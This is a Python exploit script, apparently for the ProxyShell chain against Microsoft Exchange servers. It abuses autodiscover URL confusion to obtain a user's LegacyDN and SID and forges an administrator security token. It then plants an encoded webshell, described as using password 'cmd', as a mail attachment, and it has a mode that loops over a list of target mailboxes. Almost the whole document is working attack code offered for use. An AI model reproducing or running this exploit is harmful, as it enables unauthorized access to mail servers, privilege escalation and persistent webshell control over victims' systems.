import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import re
import sys
import xml.etree.ElementTree as ET
from struct import *
import base64
#proxies={'https':'http://127.0.0.1:8080'}
#webshell password cmd
webshell="ldZUhrdpFDnNqQbf96nf2v+CYWdUhrdpFII5hvcGqRT/gtbahqXahoI5uanf2jmp1mlU041pqRT/FIb32tld9wZUFLfTBjm5qd/aKSDTqQ2MyenapanNjL7aXPfa1hR+glSNDYIPa4L3BtapXdqCyTEhlfvWVIa3aRTZ"

def send_mail(url,sid,mail_address):
	#send webshell in mail
	print("webshell_content:"+webshell)
	url = f"{url}/autodiscover/autodiscover.json?a=mhgod@jjvhk.mrb/EWS/Exchange.asmx"
	cookies = {"Email": "autodiscover/autodiscover.json?a=mhgod@jjvhk.mrb"}
	headers = {"Accept-Encoding": "gzip, deflate", "Content-Type": "text/xml", "User-Agent": "python-urllib3/1.26.6", "Connection": "close"}
	data = f"<soap:Envelope \r\n  xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" \r\n  xmlns:m=\"http://schemas.microsoft.com/exchange/services/2006/messages\" \r\n  xmlns:t=\"http://schemas.microsoft.com/exchange/services/2006/types\" \r\n  xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n  <soap:Header>\r\n    <t:RequestServerVersion Version=\"Exchange2016\" />\r\n    <t:SerializedSecurityContext>\r\n      <t:UserSid>{sid}</t:UserSid>\r\n      <t:GroupSids>\r\n        <t:GroupIdentifier>\r\n          <t:SecurityIdentifier>S-1-5-21</t:SecurityIdentifier>\r\n        </t:GroupIdentifier>\r\n      </t:GroupSids>\r\n    </t:SerializedSecurityContext>\r\n  </soap:Header>\r\n  <soap:Body>\r\n    <m:CreateItem MessageDisposition=\"SaveOnly\">\r\n      <m:Items>\r\n        <t:Message>\r\n          <t:Subject>microsoft</t:Subject>\r\n          <t:Body BodyType=\"HTML\">exchange</t:Body>\r\n          <t:Attachments>\r\n            <t:FileAttachment>\r\n              <t:Name>update.txt</t:Name>\r\n              <t:IsInline>false</t:IsInline>\r\n              <t:IsContactPhoto>false</t:IsContactPhoto>          <t:Content>{webshell}</t:Content>\r\n            </t:FileAttachment>\r\n          </t:Attachments>\r\n          <t:ToRecipients>\r\n            <t:Mailbox>\r\n              <t:EmailAddress>{mail_address}</t:EmailAddress>\r\n            </t:Mailbox>\r\n          </t:ToRecipients>\r\n        </t:Message>\r\n      </m:Items>\r\n    </m:CreateItem>\r\n  </soap:Body>\r\n</soap:Envelope>"
	r=requests.post(url, headers=headers, cookies=cookies, data=data,verify=False)
	print("send mail ok")

def attack_mail(url,mail):
	domain=url
	url = f"{url}/Autodiscover/autodiscover.json?a={mail}/autodiscover/autodiscover.xml"
	cookies = {"Email": f"Autodiscover/autodiscover.json?a={mail}"}
	headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (MacOS/mp1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36", "Content-Type": "text/xml"}
	data = "\r\n<Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006\">\r\n    <Request>\r\n      <EMailAddress>"+mail+"</EMailAddress>\r\n      <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>\r\n    </Request>\r\n</Autodiscover>"
	r=requests.post(url, headers=headers, cookies=cookies, data=data,verify=False,timeout=5)
	r=re.findall("<LegacyDN>(.*)</LegacyDN>",r.text)
	legacydn=r[0]
	print(legacydn)
	if "Administrative" in legacydn:		
		print("mail:"+mail)
		print("legacydn:"+legacydn)
		try:
			sid=get_sid(domain,legacydn)
			token=get_token(mail,sid)
			print("token:"+token)
			if(len(sid)>3):
				if(sys.argv[3]=='send'):
					send_mail(domain,sid,mail)
		except:
			pass
	else:
		print(f"{url.split('/')[2]} bad mail {mail}")

def get_token(uname, sid):
    version = 0
    ttype = 'Windows'
    compressed = 0
    auth_type = 'Kerberos'
    raw_token = b''
    gsid = 'S-1-5-32-544'
    version_data = b'V' + (1).to_bytes(1, 'little') + (version).to_bytes(1, 'little')
    type_data = b'T' + (len(ttype)).to_bytes(1, 'little') + ttype.encode()
    compress_data = b'C' + (compressed).to_bytes(1, 'little')
    auth_data = b'A' + (len(auth_type)).to_bytes(1, 'little') + auth_type.encode()
    login_data = b'L' + (len(uname)).to_bytes(1, 'little') + uname.encode()
    user_data = b'U' + (len(sid)).to_bytes(1, 'little') + sid.encode()
    group_data = b'G' + pack('<II', 1, 7) + (len(gsid)).to_bytes(1, 'little') + gsid.encode()
    ext_data = b'E' + pack('>I', 0) 
 
    raw_token += version_data
    raw_token += type_data
    raw_token += compress_data
    raw_token += auth_data
    raw_token += login_data
    raw_token += user_data
    raw_token += group_data
    raw_token += ext_data
    data = base64.b64encode(raw_token).decode()
    return data

def get_sid(url,legacydn):
	url = f"{url}/Autodiscover/autodiscover.json?a=Administrator@edd.com/mapi/emsmdb"
	cookies = {"Email": "Autodiscover/autodiscover.json?a=Administrator@edd.com"}
	headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Chromium\";v=\"92\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"92\"", "Sec-Ch-Ua-Mobile": "?0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "X-Requesttype": "connect", "X-Clientinfo": "2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}", "X-Clientapplication": "utlook/15.0.4815.1002", "X-Requestid": "C715155F-2BE8-44E0-BD34-2960067874C8}:2", "Content-Type": "application/mapi-http", "Referer": "https://mail.eee.com/owa/auth/logon.aspx?url=https%3a%2f%2fmail.eee.com%2fowa%2f&reason=0", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,zh-TW;q=0.8,en-US;q=0.7,en;q=0.6"}
	data = legacydn
	data += '\x00\x00\x00\x00\x00\xe4\x04'
	data += '\x00\x00\x09\x04\x00\x00\x09'
	data += '\x04\x00\x00\x00\x00\x00\x00'
	r=requests.post(url, headers=headers, cookies=cookies, data=data,verify=False,timeout=10) 
	sid=r.text.split("with SID ")[1].split(" and MasterAccountSid")[0]
	print("sid:"+sid)
	return sid





if __name__ == '__main__':
	if len(sys.argv)>1:
		try:
			if(sys.argv[2]=='crack'):
				with open('mail.txt','r') as f:
					for mail_address in f.readlines():
						print(mail_address.strip('\n'))
						try:
							attack_mail(sys.argv[1],mail_address.strip('\n'))
						except:
							pass
			else:
				attack_mail(sys.argv[1],sys.argv[2])
		except:
			print("error Are you sure mail or url ok ?")
			pass
	else:
		print("python send_mail.py  https://example.com  Admin@example.com")